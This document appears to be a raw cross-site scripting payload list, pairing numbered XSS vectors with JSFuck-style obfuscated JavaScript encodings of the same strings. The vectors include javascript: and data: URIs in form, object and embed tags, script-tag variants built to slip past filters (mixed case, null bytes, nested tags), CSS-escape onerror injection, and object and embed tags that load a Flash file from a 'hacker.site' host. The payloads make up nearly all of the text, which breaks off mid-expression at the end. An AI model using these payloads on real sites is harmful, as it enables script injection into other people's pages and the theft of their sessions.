String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+(undefined+"")[0]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+"")[3]+(true+"")[3]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([][""]+"")[2]+(undefined+"")[0]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<form id=x></form><button form=x formaction="javascript:prompt(369)">send</button>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[7]+([false]+"")[10]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+(undefined+"")[0]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+[0]+"")[7]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+([false]+"")[3]+(true+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+"")[3]+(true+"")[3]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([][""]+"")[2]+(undefined+"")[0]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="javascript:prompt(371)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="data:text/html,<script>prompt(373)</script>">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="data:text/html,base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+([][""]+"")[2]+(false+"")[1]+(false+"")[3]+(true+"")[3]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(+(101))["to"+String["name"]]()[1]+(undefined+"")[1]+([][""]+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([][""]+"")[4]+([][""]+"")[4]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+(101))["to"+String["name"]]()[1]+([][""]+"")[2]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+([][""]+"")[4]+([false]+"")[3]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([false]+"")[3]+(+!+[]+!+[]+[])[0]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+([][""]+"")[2]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="//hacker.site/xss.swf">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(false+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[3]+([false]+"")[10]+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<embed code="//hacker.site/xss.swf" allowscriptaccess=always>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[2]+(true+"")[3]+([][""]+"")[4]+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(false+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[3]+([false]+"")[10]+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+(false+"")[1]+(false+"")[2]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+"")[1]+([false]+"")[3]+([false]+"")[3]+(true+"")[3]+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<ScRipt>prompt(381);</ScRipt>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<ScRipt>prompt(383);
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()
<script/random>>prompt(385);</script>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(true+"")[1]+(false+"")[1]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<script\n>prompt(387);</script>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<scr<script>itp>prompt(389);</scr</script>itp>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+([false]+"")[10]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+([false]+"")[10]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<scr\x00ipt>prompt(391);</scr\x00ipt>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<listing>&lt;img src=1 onerror=prompt(393)&gt;</listing>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[2]+([false]+"")[10]+(false+"")[3]+(true+"")[0]+([false]+"")[10]+(undefined+"")[1]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+(false+"")[2]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+[])[0]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+(false+[0]+"")[2]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[2]+([false]+"")[10]+(false+"")[3]+(true+"")[0]+([false]+"")[10]+(undefined+"")[1]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<listing><img src=1 onerror=prompt(395)></listing>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[2]+([false]+"")[10]+(false+"")[3]+(true+"")[0]+([false]+"")[10]+(undefined+"")[1]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+[])[0]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[2]+([false]+"")[10]+(false+"")[3]+(true+"")[0]+([false]+"")[10]+(undefined+"")[1]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img style="font-fa\22onerror\3d\61ert\28\31\29\20mily: 'arial'"src="x:x" />
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(false+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+!+[]+[])[0]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(true+"")[3]+(true+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[10]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+(false+"")[1]+(true+"")[1]+([false]+"")[10]+(false+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return 